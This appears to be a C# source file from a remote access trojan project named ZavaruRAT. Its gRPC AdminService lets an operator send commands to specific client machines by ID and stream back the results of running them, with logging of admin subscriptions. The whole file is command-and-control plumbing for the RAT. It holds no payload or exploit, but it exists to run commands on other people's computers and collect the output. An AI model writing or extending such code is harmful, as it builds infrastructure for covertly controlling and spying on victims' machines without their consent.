#region

using Google.Protobuf.WellKnownTypes;
using Grpc.Core;
using ZavaruRAT.Main.Runtime;
using ZavaruRAT.Proto;

#endregion

namespace ZavaruRAT.Main.Services;

public sealed class AdminService : AdminHub.AdminHubBase
{
    private readonly ClientsStorage _storage;
    private readonly ILogger<AdminService> _logger;

    public AdminService(ClientsStorage storage, ILogger<AdminService> logger)
    {
        _storage = storage;
        _logger = logger;
    }

    public override Task<Empty> InvokeCommand(InvokeCommandRequest request, ServerCallContext context)
    {
        var command = new CommandEvent
        {
            ClientId = request.ClientId,
            HashId = request.HashId,
            Command = request.Command
        };

        _storage.ExecuteCommand(command);

        return Task.FromResult(new Empty());
    }

    public override async Task CommandResults(Empty request, IServerStreamWriter<CommandExecutedEvent> responseStream,
                                              ServerCallContext context)
    {
        _logger.LogInformation("Admin {Admin} subscribed to command executed updates", context.Host);

        try
        {
            var commands = _storage.GetCommandResults();

            await foreach (var ev in commands.ToAsyncEnumerable().WithCancellation(context.CancellationToken))
            {
                _logger.LogInformation("Sending command executed event {Command}", ev);

                await responseStream.WriteAsync(ev);
            }
        }
        catch (TaskCanceledException)
        {
        }

        _logger.LogInformation("Admin {Admin} unsubscribed from command executed updates", context.Host);
    }
}
